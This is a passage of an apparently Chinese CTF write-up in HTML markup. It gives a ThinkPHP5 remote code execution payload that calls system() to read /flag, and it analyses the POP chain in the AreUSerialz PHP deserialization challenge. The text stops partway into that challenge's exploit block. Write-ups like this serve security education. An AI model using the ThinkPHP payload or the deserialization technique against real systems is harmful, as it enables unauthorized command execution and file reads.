&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;打开网站提示 THINKPHP5&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/nongchaoer/p/12029478.html&#34;&gt;https://www.cnblogs.com/nongchaoer/p/12029478.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;测试 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight oxygene&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs oxygene&#34;&gt;POST ?s=xxx&lt;br&gt;&lt;br&gt;&lt;br&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;&amp;amp;&lt;span class=&#34;hljs-title&#34;&gt;server&lt;/span&gt;[&lt;span class=&#34;hljs-title&#34;&gt;REQUEST_METHOD&lt;/span&gt;]=&lt;span class=&#34;hljs-title&#34;&gt;cat&lt;/span&gt; /&lt;span class=&#34;hljs-title&#34;&gt;flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;网鼎杯-2020-青龙组areuserialz&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网鼎杯-2020-青龙组areuserialz&#34;&gt;#&lt;/a&gt; [网鼎杯 2020 青龙组] AreUSerialz&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;FileHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/tmp/tmpfile&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hello World!&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;process&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write();&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read();&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Bad Hacker!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(strlen((&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content) &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Too long!&amp;quot;&lt;/span&gt;);&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;();&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_put_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Successful!&amp;quot;&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;read&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;output&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[Result]: &amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op === &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;is_valid&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; strlen(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;); &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;++)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!(ord(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;]) &amp;gt;= &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt; &amp;amp;&amp;amp; ord(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;]) &amp;lt;= &lt;span class=&#34;hljs-number&#34;&gt;125&lt;/span&gt;))&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;&amp;#125;)) &amp;#123;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt; = (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(is_valid(&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;)) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$obj&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;反序列化的题目，寻找 POP 链&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;read () 可以读文件 =&amp;gt;read () 会被 process () 调用 =&amp;gt;process () 会被 &lt;code&gt;__construct()&lt;/code&gt;  还有 &lt;code&gt;__destruct()&lt;/code&gt;  调用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;由于 &lt;code&gt;__construct()&lt;/code&gt;  会初始化导致文件名不可控，且其可以绕过，而 &lt;code&gt;__destruct()&lt;/code&gt; , 会让 op 强制等于 1，但是这里用了 &lt;code&gt;===‘2’&lt;/code&gt; ，也就是说如果 op 为整型 2，即可绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;同时这题有一个 check，我们把 protected 改成 public 即可绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td 